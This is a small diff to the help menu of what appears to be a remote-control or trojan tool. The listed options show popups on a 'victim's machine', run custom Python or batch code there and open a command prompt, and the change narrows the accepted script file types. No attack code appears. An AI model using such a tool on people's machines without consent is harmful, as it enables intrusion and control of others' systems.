@@ -10,7 +10,7 @@
 -k -h          --KEY -h           Opens up help menu for key triggers.
 -pop           --POPUP            Shows a custom popup on victim's machine.
 -scr           --SCRIPT           Run a custom python or batch code on victim's machine.
-                                  * Code can be loaded either from .py or .txt file.
+                                  * Code can be loaded from .py and .bat file only.
                                   * All the print statements will be returned back to the user and not be printed on target's machine.
 
 -cmd           --COMMAND          Enter command prompt.
